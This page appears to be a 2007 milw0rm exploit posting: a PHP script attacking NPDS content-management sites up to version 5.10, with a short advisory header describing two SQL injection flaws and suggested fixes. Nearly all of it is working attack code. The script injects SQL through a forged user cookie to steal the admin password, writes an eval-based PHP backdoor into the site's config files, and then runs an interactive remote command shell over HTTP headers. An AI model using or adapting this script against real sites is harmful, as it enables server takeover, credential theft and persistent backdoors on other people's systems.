<html><head><title>Net Portal Dynamic System (NPDS) <= 5.10 Remote Code Execution (2)</title></head><pre>&lt;?php
/*---------------------------------------------------------*\
NPDS &lt;= 5.10 - Remote Code Execution exploit

[|Description:|]
Security holes were found in NPDS 5.10.

N°1: Sql Injection in cookies (File Mainfile.php lines 655 to 691).
No check is carried out on nicknames or Id which can allow an attacker
to modify a SQL request so as to obtain data.

N°2: SQL Injection due to a bad use of &quot;X_FORWARDED_FOR&quot; (file Mainfile.php lines 88 to 110).
NPDS uses the HTTP header &quot;X_FORWARDED_FOR&quot; which normally contains the IP adress
of a person using a non anonymous proxy. This Ip address is used in a SQL resquest without appropriate
filtering, and an attacker can define &quot;X_FORWARDED_FOR&quot; insering malicious SQL code.

[|Advisory:|]
http://www.aeroxteam.fr/advisory-NPDS-5.10.txt

[|Solution:|]
N°1: File mainfile.php, add after line 665:
$cookie[0] = inval($cookie[0);
$cookie[1] = addslashes($cookie[1]);
$cookie[2] = addslashes($cookie[2]);

N°2: Replace fonction &quot;getip&quot; (mainfile.php) by:
function getip() {
	return $_SERVER['REMOTE_ADDR'];
}

Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)
for AeroX (AeroXteam.fr)
(C)opyleft 2007
Gr33tz: Darkfig, Spamm, Math², Barma, NeoMorphS, Snake91, Kad, Nitr0, BlastKiller, Alkino And everybody from #aerox@irc.epiknet.org
\*---------------------------------------------------------*/
if(count($argv) == 5) {
	head();
	echo &quot;\r\n[+] Connection... &quot;;
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	########
	
	echo &quot;OK\r\n&quot;;
	echo &quot;[+] Logging to account... &quot;;
	$reqlogin = &quot;POST &quot;.$argv[2].&quot;user.php HTTP/1.1\r\n&quot;;
	$reqlogin .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$reqlogin .= &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n&quot;;
	$reqlogin .= &quot;Accept: */*\r\n&quot;;
	$reqlogin .= &quot;Connection: close\r\n&quot;;
	$reqlogin .= &quot;Referer: http://&quot;.$argv[1].&quot;&quot;.$argv[2].&quot;user.php\r\n&quot;;
	$reqlogin .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$reqlogin .= &quot;Content-Length: &quot;.strlen(&quot;uname=&quot;.$argv[3].&quot;&amp;pass=&quot;.$argv[4].&quot;&amp;op=login&quot;).&quot;\r\n\r\n&quot;;
	$reqlogin .= &quot;uname=&quot;.$argv[3].&quot;&amp;pass=&quot;.$argv[4].&quot;&amp;op=login&quot;;
	fwrite($sock, $reqlogin);
	unset($reqlogin);
	$pagelogin = '';
	while(!feof($sock)) {
		$pagelogin .= fgets($sock);
	}
	fclose($sock);
	preg_match(&quot;`Set-Cookie: user=(.*?);`&quot;, $pagelogin, $cookie);
	if(empty($cookie[1])) {
		die(&quot;Failed\r\n\r\nCould not login as &quot;.$argv[3].&quot; !&quot;);
	} else {
		echo &quot;OK\r\n&quot;;
	}
	
	if(($decoded = base64_decode($cookie[1])) !== false) {
		$exploded = explode(':', $decoded);
		$exploded[0] = &quot;' UNION SELECT CONCAT(0x4055534552, aid, 0x5553455240, 0x204050415353, pwd, 0x5041535340) FROM authors WHERE radminsuper=1 LIMIT 0,1 /*&quot;;
		$exploded[8] = 1;
		$cookieuser = base64_encode(implode(':', $exploded));
	}
	########
	
	echo &quot;[+] Getting admin password... &quot;;	
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}

	$reqpass  = &quot;GET &quot;.$argv[2].&quot;index.php?op=edito HTTP/1.1\r\n&quot;;
	$reqpass .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$reqpass .= &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n&quot;;
	$reqpass .= &quot;Accept: */*\r\n&quot;;
	$reqpass .= &quot;Connection: close\r\n&quot;;
	$reqpass .= &quot;Cookie: user=&quot;.$cookieuser.&quot;; user_language=french\r\n\r\n&quot;;
	fwrite($sock, $reqpass);
	unset($reqpass);
	$pagepass = '';
	while(!feof($sock)) {
		$pagepass .= fgets($sock);
	}
	fclose($sock);
	preg_match(&quot;`@USER(.*?)USER@ @PASS(.*?)PASS@`&quot;, $pagepass, $result);
	unset($pagepass);
	
	if(empty($result[1]) || empty($result[2])) {
		fclose($sock);
		die(&quot;Failed !\r\n\r\nMaybe not vulnerable ?!&quot;);
	} else {
		echo &quot;OK\r\n&quot;;
	}
	########
	
	echo &quot;[+] Login to admin &amp; injecting PHP code... &quot;;
	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	
	$cookieadmin = base64_encode($result[1].':'.md5($result[2]));
	
	$reqshell  = &quot;POST &quot;.$argv[2].&quot;admin.php?op=ConfigFiles_save HTTP/1.1\r\n&quot;;
	$reqshell .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$reqshell .= &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n&quot;;
	$reqshell .= &quot;Accept: */*\r\n&quot;;
	$reqshell .= &quot;Connection: close\r\n&quot;;
	$reqshell .= &quot;Cookie: admin=&quot;.$cookieadmin.&quot;; user_language=french\r\n&quot;;
	$reqshell .= &quot;Referer: http://&quot;.$argv[1].&quot;&quot;.$argv[2].&quot;admin.php\r\n&quot;;
	$reqshell .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$reqshell .= &quot;Content-Length: &quot;.strlen(&quot;Xtxt=&quot;.urlencode(&quot;&lt;?php\r\n   include(\&quot;modules/aide-contextuelle/AC-header.js\&quot;);\r\n   if(!empty(\$_SERVER['PHPSHELL'])){eval(\$_SERVER['PHPSHELL']);die();}\r\n?&gt;&quot;).&quot;&amp;Xfiles=header_head&amp;confirm=Sauver+les+modifications&quot;).&quot;\r\n\r\n&quot;;
	$reqshell .= &quot;Xtxt=&quot;.urlencode(&quot;&lt;?php\r\n   include_once(\&quot;modules/ipban/ban.php\&quot;);\r\n   if(!empty(\$_SERVER['HTTP_PHPCODE'])){eval(urldecode(base64_decode(\$_SERVER['HTTP_PHPCODE'])));die();}\r\n?&gt;&quot;).&quot;&amp;Xfiles=header_before&amp;confirm=Sauver+les+modifications&quot;;
	fwrite($sock, $reqshell);
	unset($reqshell);
	$pageshell = '';
	while(!feof($sock)) {
		$pageshell .= fgets($sock);
	}
	fclose($sock);
	
	if(preg_match('`location: admin\.php\?op=ConfigFiles`', $pageshell)) { $ok = 1; }
	unset($pageshell);
	
	if(!$ok) {
		die(&quot;Failed\r\n\r\nUnable to write PHP Code&quot;);
	} else {
		echo &quot;OK\r\n\r\n&quot;;
	}
	
	while(1) {
		unset($exec);
		echo &quot;[PhpShell@&quot;.$argv[1].&quot;]$ &quot;;
		$input = trim(fgets(STDIN));
		if($input == 'quit' || $input == 'exit') {
			break;
		}
		$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
		if (!$sock) {
			die(&quot;\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
		}
		$req  = &quot;GET &quot;.$argv[2].&quot;index.php?op=edito HTTP/1.1\r\n&quot;;
		$req .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
		$req .= &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n&quot;;
		$req .= &quot;Accept: */*\r\n&quot;;
		$req .= &quot;PHPCODE: &quot;.urldecode(base64_encode($input)).&quot;\r\n&quot;;
		$req .= &quot;Connection: close\r\n\r\n&quot;;
		fwrite($sock, $req);
		unset($req);
		$headers = 0;
		while(!feof($sock)) {
			$buffer = fgets($sock);
			if(!$headers) {
				if($buffer == &quot;\r\n&quot;) { $headers = 1; }
			} else {
				$exec .= $buffer;
			}
		}
		echo $exec.&quot;\r\n\r\n&quot;;
	}
} else {
	usage();
}
function usage() {
	echo &quot;+------------------------------------------------------+\r\n&quot;;
	echo &quot;|      NPDS &lt;= 5.10 Remote Code Execution exploit      |\r\n&quot;;
	echo &quot;|             By Gu1ll4um3r0m41n for AeroX             |\r\n&quot;;
	echo &quot;|              You need a user account !!              |\r\n&quot;;
	echo &quot;|   Usage: php exploit.php site.com /path/ user pass   |\r\n&quot;;
	echo &quot;+------------------------------------------------------+\r\n&quot;;
}
function head() {
	echo &quot;+----------------------------------------------+\r\n&quot;;
	echo &quot;|  MPDS &lt;= 5.10 Remote Code Execution exploit  |\r\n&quot;;
	echo &quot;|         By Gu1ll4um3r0m41n for AeroX         |\r\n&quot;;
	echo &quot;+----------------------------------------------+\r\n\r\n&quot;;
}
?&gt;

# milw0rm.com [2007-05-04]</pre></html>